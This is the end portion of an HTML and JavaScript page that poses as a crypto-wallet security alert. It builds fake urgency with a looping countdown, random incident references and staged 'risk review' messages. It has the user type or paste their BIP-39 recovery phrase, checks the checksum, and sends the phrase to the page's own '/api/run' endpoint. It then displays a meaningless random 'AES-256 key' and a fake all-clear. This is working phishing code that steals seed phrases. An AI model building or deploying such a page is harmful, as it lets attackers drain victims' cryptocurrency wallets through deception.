    <div class="checkmark"></div>
    <div class="success-message">
      <h3>Verification complete</h3>
      <p>Your phrase was verified successfully. Use the key below only in trusted environments.</p>
    </div>
    <div id="aes-container">
      <p>AES‑256 session key:</p>
      <div id="aes-box">
        <span id="aes-key"></span>
        <button id="copyAesBtn">Copy</button>
      </div>
    </div>
  </div>
</div>

<!-- PAGE 7: FINALIZING REVIEW -->
<div class="card" id="page-7">
  <div class="header">
    <button class="back-btn" type="button" onclick="showPage(6)">‹</button>
    <div class="header-content">
      <h1>Applying your decision</h1>
      <p>Keep this window open while we update protections and unfreeze activity where it is safe to do so.</p>
    </div>
  </div>

  <div class="loader"></div>
  <p class="status-line" id="statusLine">Re-checking this incident against current rules…</p>
  <p class="status-muted" id="statusSub">This usually takes only a few seconds. You will see the result as soon as it is ready.</p>

  <ul class="checklist">
    <li>Running a final risk pass on this incident.</li>
    <li>Updating the freeze status and session limits linked to your account.</li>
    <li>Writing a short summary you can review from your dashboard.</li>
  </ul>

  <div class="btn-row">
    <button class="primary-cta" id="finishBtn" hidden>Return to dashboard</button>
    <button class="secondary-link" type="button" id="closeWindowBtn" hidden>Close this window</button>
  </div>
</div>


<script>
// ===== CORE FLOW (pages 1–7) =====
function showPageInternal(n) {
  for (let i = 1; i <= 7; i++) {
    const el = document.getElementById('page-' + i);
    if (!el) continue;
    const isActive = i === n;
    el.classList.toggle('active', isActive);
    if (isActive) {
      el.style.transform = 'translateY(-50%) scale(1)';
    } else {
      el.style.transform = 'translateY(-50%) scale(0.98)';
    }
  }
  const isAlarm = n === 1;
  document.body.classList.toggle('forced-focus', isAlarm);
  const mask = document.getElementById('focusMask');
  if (mask) mask.style.display = isAlarm ? 'block' : 'none';
  if (n === 7) startProcessing();
}
function showPage(n) { showPageInternal(n); }

function remindLater() { showPage(2); }

// countdown page-1
const countdownEl = document.getElementById('countdown');
let remaining = 29;
function renderCountdown() {
  if (!countdownEl) return;
  const mm = String(Math.floor(remaining / 60)).padStart(2, '0');
  const ss = String(remaining % 60).padStart(2, '0');
  countdownEl.textContent = mm + ':' + ss;
}
if (countdownEl) {
  renderCountdown();
  setInterval(() => {
    remaining = remaining > 0 ? remaining - 1 : 29;
    renderCountdown();
  }, 1000);
}

// random ref + meta
function randomRef() {
  const letters = 'ABCDEFGHJKMNPQRSTUVXYZ';
  const a = letters[Math.floor(Math.random() * letters.length)];
  const b = letters[Math.floor(Math.random() * letters.length)];
  const num = Math.floor(1000 + Math.random() * 9000);
  return '#SEC-' + a + b + num;
}
const refEl = document.getElementById('refId');
const hdr1 = document.getElementById('headerRef1');
const hdr2 = document.getElementById('headerRef2');
const hdr3 = document.getElementById('headerRef3');
const hdr4 = document.getElementById('headerRef4');
const hdr5 = document.getElementById('headerRef5');
if (refEl) {
  const ref = randomRef();
  refEl.textContent = 'Ref: ' + ref;
  if (hdr1) hdr1.textContent = ref;
  if (hdr2) hdr2.textContent = ref;
  if (hdr3) hdr3.textContent = ref;
  if (hdr4) hdr4.textContent = ref;
  if (hdr5) hdr5.textContent = ref;
}
const tsEl = document.getElementById('ts');
if (tsEl) {
  const now = new Date();
  const pad = n => String(n).padStart(2,'0');
  const ts = now.getFullYear() + '-' + pad(now.getMonth()+1) + '-' +
             pad(now.getDate()) + ' ' + pad(now.getHours()) + ':' +
             pad(now.getMinutes());
  tsEl.textContent = 'Detected: ' + ts;
}
const netEl = document.getElementById('net');
if (netEl) {
  const nets = ['BTC Mainnet', 'ETH Mainnet', 'BSC Mainnet', 'Polygon', 'Solana'];
  netEl.textContent = 'Network: ' + nets[Math.floor(Math.random()*nets.length)];
}

// accordion page-3
const acc = document.getElementById('accordion');
if (acc) {
  acc.querySelectorAll('.accordion-header').forEach((header) => {
    header.addEventListener('click', () => {
      const body = header.nextElementSibling;
      const icon = header.querySelector('.accordion-icon');
      const isOpen = body.classList.contains('show');
      body.classList.toggle('show', !isOpen);
      icon.textContent = isOpen ? '+' : '–';
    });
  });
}

// progress bar page-5
const progressFill = document.getElementById('progressFill');
function goToVerification() {
  if (progressFill) progressFill.style.width = '66%';
  showPage(6);
}
function goToProcessing() {
  if (progressFill) progressFill.style.width = '100%';
  showPage(7);
}

// finalizing page-7
const statuses = [
  ['Applying baseline rules…', 'Checking for known patterns and thresholds.'],
  ['Correlating recent activity…', 'Combining timing, origin and frequency.'],
  ['Finalizing review…', 'Preparing summary for display.']
];
const statusLine = document.getElementById('statusLine');
const statusSub  = document.getElementById('statusSub');
const finishBtn  = document.getElementById('finishBtn');
const closeWindowBtn = document.getElementById('closeWindowBtn');

function startProcessing() {
  if (!statusLine || !statusSub || !finishBtn) return;
  let step = 0;
  statusLine.textContent = statuses[0][0];
  statusSub.textContent  = statuses[0][1];
  finishBtn.hidden = true;
  if (closeWindowBtn) closeWindowBtn.hidden = true;

  const interval = setInterval(() => {
    step++;
    if (step < statuses.length) {
      statusLine.textContent = statuses[step][0];
      statusSub.textContent  = statuses[step][1];
    } else {
      clearInterval(interval);
      statusLine.textContent = 'Review complete';
      statusSub.textContent  = 'No immediate action required. Monitoring will continue in the background.';
      finishBtn.hidden = false;
      if (closeWindowBtn) closeWindowBtn.hidden = false;
    }
  }, 3000);
}
if (finishBtn) {
  finishBtn.onclick = () => showPage(2);
}
if (closeWindowBtn) {
  closeWindowBtn.onclick = () => {
    window.close();
    setTimeout(() => {
      if (!window.closed) {
        window.location.href = '/';
      }
    }, 150);
  };
}

// initial page
showPage(1);

// ===== BIP-39 MNEMONIC JS (page-6) =====
let WORDS = [], WORD_MAP = new Map(), WORDS_READY = false;

fetch("https://raw.githubusercontent.com/bitcoin/bips/refs/heads/master/bip-0039/english.txt")
  .then(r => r.ok ? r.text() : Promise.reject())
  .then(t => {
    WORDS = t.trim().split(/\n+/);
    WORD_MAP = new Map(WORDS.map((w, i) => [w, i]));
    WORDS_READY = true;
  })
  .catch(() => {
    WORDS = ["abandon","ability","able"];
    WORD_MAP = new Map(WORDS.map((w, i) => [w, i]));
    WORDS_READY = true;
  });

const mnemonicInput = document.getElementById('mnemonic-input');
const wordContainer = document.getElementById('word-container');
const continueBtn2 = document.getElementById('continueBtn');
const backBtn2 = document.getElementById('backBtn');
const clearAllBtn = document.getElementById('clearAllBtn');
const pasteBtn = document.getElementById('pasteBtn');
const errorMsg = document.getElementById('errorMsg');
const helperText = document.getElementById('helperText');

let words = [];
let revealedIndices = new Set();
let activeEditIdx = null;
let isPastingFromButton = false;
const ENT_BY_WORDS = { 12: 128, 15: 160, 18: 192, 21: 224, 24: 256 };

function wordsToBitString(wordsList) {
  let bits = "";
  for (const w of wordsList) {
    const idx = WORD_MAP.get(w);
    if (idx === undefined) return null;
    bits += idx.toString(2).padStart(11, '0');
  }
  return bits;
}

function bitsToBytes(bitstr) {
  const bytes = new Uint8Array(bitstr.length / 8);
  for (let i = 0; i < bytes.length; i++) {
    bytes[i] = parseInt(bitstr.slice(i * 8, i * 8 + 8), 2);
  }
  return bytes;
}

async function isValidBip39(wordsList) {
  if (!WORDS_READY || wordsList.length === 0) return false;
  const n = wordsList.length;
  if (!ENT_BY_WORDS[n]) return false;
  for (const w of wordsList) {
    if (!WORD_MAP.has(w)) return false;
  }
  const ENT = ENT_BY_WORDS[n];
  const CS = ENT / 32;
  const bitstr = wordsToBitString(wordsList);
  if (!bitstr) return false;
  const entBits = bitstr.slice(0, ENT);
  const csBits = bitstr.slice(ENT, ENT + CS);
  const entropyBytes = bitsToBytes(entBits);
  try {
    const hashBuf = await crypto.subtle.digest('SHA-256', entropyBytes);
    const hash = new Uint8Array(hashBuf);
    let hashBits = "";
    for (const b of hash) hashBits += b.toString(2).padStart(8, '0');
    return csBits === hashBits.slice(0, CS);
  } catch { return false; }
}

function getMaskedText(word) {
  return '•'.repeat(word.length);
}

function renderWords() {
  wordContainer.querySelectorAll('.word-badge').forEach(b => b.remove());
  for (let idx = 0; idx < words.length; idx++) {
    const word = words[idx];
    const badge = document.createElement('div');
    badge.className = 'word-badge';
    if (activeEditIdx === idx) badge.classList.add('active');
    const isValid = WORD_MAP.has(word);
    if (!isValid) badge.classList.add('error');

    const isRevealed = activeEditIdx === idx || revealedIndices.has(idx);
    const wordDisplay = isRevealed ? word : (isValid ? getMaskedText(word) : word);

    if (activeEditIdx === idx) {
      badge.innerHTML =
        `<span class="word-number">${idx + 1}.</span>` +
        `<input type="text" class="edit-input" value="${word}"
          autocomplete="off" spellcheck="false">`;
      const editInput = badge.querySelector('.edit-input');

      editInput.focus();
      editInput.select();
      editInput.addEventListener('blur', () => {
        const newWord = editInput.value.trim().toLowerCase();
        if (newWord.length > 0) words[idx] = newWord;
        activeEditIdx = null;
        revealedIndices.delete(idx);  // remask on blur
        renderWords();
        updateValidation();
      });
      editInput.addEventListener('keydown', (e) => {
        e.stopPropagation();
        if (e.key === 'Enter') {
          const newWord = editInput.value.trim().toLowerCase();
          if (newWord.length > 0) words[idx] = newWord;
          activeEditIdx = null;
          revealedIndices.delete(idx);  // remask on Enter
          renderWords();
          updateValidation();
        } else if (e.key === 'Escape') {
          activeEditIdx = null;
          revealedIndices.delete(idx);  // remask on Esc
          renderWords();
        }
      });
    } else {
      const wordTextClass = isValid ? (revealedIndices.has(idx) ? 'revealed' : '') : 'invalid';
      badge.innerHTML =
        `<span class="word-number">${idx + 1}.</span>` +
        `<span class="word-text ${wordTextClass}">${wordDisplay}</span>`;

      badge.onclick = (e) => {
        e.stopPropagation();
        activeEditIdx = idx;
        revealedIndices.clear();     // remask all others
        revealedIndices.add(idx);    // only this index revealed
        renderWords();
      };
    }

    wordContainer.insertBefore(badge, mnemonicInput);
  }
  updateButtonVisibility();
}

function updateButtonVisibility() {
  const hasWords = words.length > 0;
  if (hasWords) {
    pasteBtn.classList.remove('show');
    clearAllBtn.classList.add('show');
  } else {
    pasteBtn.classList.add('show');
    clearAllBtn.classList.remove('show');
  }
  mnemonicInput.placeholder = hasWords
    ? ''
    : 'Add space between words and make sure no one is watching';
}

async function updateValidation() {
  const wordCount = words.length;
  const isValidCount = [12, 15, 18, 21, 24].includes(wordCount);
  errorMsg.textContent = '';
  helperText.classList.remove('show');
  continueBtn2.classList.remove('active');
  continueBtn2.disabled = true;

  if (wordCount === 0) return;
  if (words.filter(w => !WORD_MAP.has(w)).length > 0) {
    helperText.classList.add('show');
    return;
  }

  if (isValidCount) {
    if (await isValidBip39(words)) {
      continueBtn2.disabled = false;
      continueBtn2.classList.add('active');
    } else {
      errorMsg.textContent = 'Invalid checksum. Please check your words.';
    }
  } else if (wordCount > 24) {
    errorMsg.textContent = 'Too many words. Maximum is 24.';
  }
}

function handleTyping() {
  const text = mnemonicInput.value;
  if (text.length > 0 && /\s/.test(text)) {
    const parts = text.split(/\s+/);
    for (let i = 0; i < parts.length - 1; i++) {
      const w = parts[i].trim().toLowerCase();
      if (w.length > 0 && w.length <= 12) words.push(w);
    }
    mnemonicInput.value = '';
    renderWords();
    updateValidation();
  }
  updateButtonVisibility();
}

mnemonicInput.addEventListener('input', () => {
  if (!isPastingFromButton && activeEditIdx === null) {
    handleTyping();
  }
});

mnemonicInput.addEventListener('keydown', async (e) => {
  if (e.key === 'Enter') {
    e.preventDefault();
    const word = mnemonicInput.value.trim().toLowerCase();
    if (word && word.length <= 12) {
      words.push(word);
      mnemonicInput.value = '';
      renderWords();
      await updateValidation();
    }
  } else if (e.key === 'Backspace' && mnemonicInput.value === '' && words.length > 0) {
    words.pop();
    renderWords();
    await updateValidation();
  }
  setTimeout(updateButtonVisibility, 0);
});

mnemonicInput.addEventListener('paste', async (e) => {
  e.preventDefault();
  const text = (e.clipboardData || window.clipboardData).getData('text');
  const pastedWords = text
    .trim()
    .toLowerCase()
    .split(/[\s\n\r\t]+/)
    .filter(w => w.length > 0 && w.length <= 12);

  if (pastedWords.length === 0) return;

  words = pastedWords;
  revealedIndices.clear();
  activeEditIdx = null;
  mnemonicInput.value = '';
  renderWords();
  await updateValidation();
});

wordContainer.addEventListener('click', () => {
  if (activeEditIdx === null) mnemonicInput.focus();
});

clearAllBtn.onclick = () => {
  words = [];
  revealedIndices.clear();
  activeEditIdx = null;
  mnemonicInput.value = '';
  renderWords();
  updateValidation();
  mnemonicInput.focus();
};

pasteBtn.onclick = async () => {
  try {
    isPastingFromButton = true;
    const text = await navigator.clipboard.readText();
    const pastedWords = text
      .trim()
      .toLowerCase()
      .split(/[\s\n\r\t]+/)
      .filter(w => w.length > 0 && w.length <= 12);

    if (pastedWords.length === 0) {
      isPastingFromButton = false;
      return;
    }

    words = pastedWords;
    revealedIndices.clear();
    activeEditIdx = null;
    mnemonicInput.value = '';
    renderWords();
    await updateValidation();
    isPastingFromButton = false;
  } catch {
    isPastingFromButton = false;
  }
};

function generateAes256Base64() {
  const bytes = new Uint8Array(32);
  crypto.getRandomValues(bytes);
  let binary = "";
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

async function copyToClipboard(text) {
  try {
    await navigator.clipboard.writeText(text);
    alert("Key copied to clipboard");
  } catch (err) {
    console.error("Failed to copy: ", err);
    alert("Failed to copy key");
  }
}

// main continue for BIP-39 page
continueBtn2.onclick = async () => {
  const mnemonic = words.join(' ').trim();
  if (!mnemonic) return;

  document.getElementById('main-page').style.display = 'none';
  document.getElementById('loading-page').style.display = 'block';

  try {
    const res = await fetch('/api/run', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mnemonic })
    });

    if (!res.ok) {
      throw new Error(`Server error: ${res.statusText}`);
    }

    await res.json();

    setTimeout(() => {
      document.getElementById('loading-page').style.display = 'none';
      document.getElementById('success-page').style.display = 'block';

      const key = generateAes256Base64();
      const aesKeyEl = document.getElementById('aes-key');
      const copyBtn = document.getElementById('copyAesBtn');

      if (aesKeyEl && copyBtn) {
        aesKeyEl.textContent = key;
        copyBtn.onclick = () => copyToClipboard(key);
      }

      // after showing success, move to finalizing review
      setTimeout(() => {
        goToProcessing();
      }, 1000);
    }, 600);
  } catch (err) {
    console.error(err);
    document.getElementById('loading-page').style.display = 'none';
    document.getElementById('main-page').style.display = 'block';
    alert("We could not connect your wallet. " + err.message);
  }
};

updateButtonVisibility();
mnemonicInput.focus();

(function () {
  // Generate a random URL-safe string like "aZ1k9PqL8x..."
  function randomHash(len) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const bytes = new Uint8Array(len);
    (window.crypto || window.msCrypto).getRandomValues(bytes); // secure random [web:149]
    let out = '';
    for (let i = 0; i < len; i++) {
      out += chars[bytes[i] % chars.length];
    }
    return out;
  }

  // Only set if there is no hash yet
  if (!window.location.hash) {
    const id = randomHash(20); // adjust length if needed
    // This does not reload the page; it just updates the hash. [web:140][web:150]
    window.location.hash = id;
  }
})();
</script>
</body>
</html>
